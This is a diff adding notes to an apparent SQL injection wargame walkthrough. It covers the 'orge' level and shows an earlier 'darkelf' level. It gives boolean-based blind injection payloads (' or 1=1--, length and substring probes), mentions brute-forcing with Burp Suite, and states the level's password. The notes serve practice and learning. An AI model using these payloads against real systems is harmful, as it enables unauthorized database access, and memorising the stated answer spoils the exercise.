@@ -34,5 +34,18 @@ level-6 (darkelf):
   -> where pw=' || id='admin'--  .("||"  it is logical operator or.)
   -> the level is cleared.
 
+level-7 (orge):
+  -> inspect the page and add a parameter named pw.
+  -> where pw=' or 1=1-- , this return the first half true in source code.
+  -> lets check the length of the password.
+  -> where pw=' or 1=1 and length(pw)>10-- , if it returns anything then it is true else it is false.
+  -> now lets take pw=' or 1=1 && substring(pw,1,1)='a'-- 
+  -> open burpsuite and on bruteforcing we will get the password .
+  -> now enter pw=7b751aec
+  -> the level is cleared.
+
+level-8 (troll):
+  -> 
+
 
 
